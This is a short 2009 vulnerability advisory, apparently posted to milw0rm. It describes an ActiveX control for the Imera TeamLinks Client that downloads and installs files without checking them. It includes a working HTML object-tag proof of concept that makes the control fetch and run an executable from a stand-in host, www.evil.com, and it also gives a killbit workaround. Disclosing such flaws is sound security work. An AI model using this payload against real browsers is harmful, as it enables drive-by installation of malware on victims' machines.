@@ -1,0 +1,38 @@
+Who:
+ Imera(http://www.imera.com)
+ Imera TeamLinks Client(http://teamlinks.imera.com/install.html)
+
+What:
+ ImeraIEPlugin.dll
+ Version 1.0.2.54
+ Dated 12/02/2008
+ {75CC8584-86D4-4A50-B976-AA72618322C6}
+ http://teamlinks.imera.com/ImeraIEPlugin.cab
+
+How:
+ This control is used to install the Imera TeamLinks Client
+package. The control fails to validate the content that it is to
+download and install is indeed the Imera TeamLinks Client software.
+
+Exploiting this issue is quite simple, like so:
+
+<object classid="clsid:75CC8584-86D4-4A50-B976-AA72618322C6"
+id="obj">
+	<param name="DownloadProtocol" value="http" />
+	<param name="DownloadHost" value="www.evil.com" />
+	<param name="DownloadPort" value="80" />
+	<param name="DownloadURI" value="evil.exe" />
+</object>
+
+Fix:
+ The vendor has been notified.
+
+Workaround:
+ Set the killbit for the affected control, see
+http://support.microsoft.com/kb/240797.
+Use the Java installer for TeamLinks Client or install the software
+manually from: http://teamlinks.imera.com/download.html
+
+Elazar
+
+# milw0rm.com [2009-03-03]
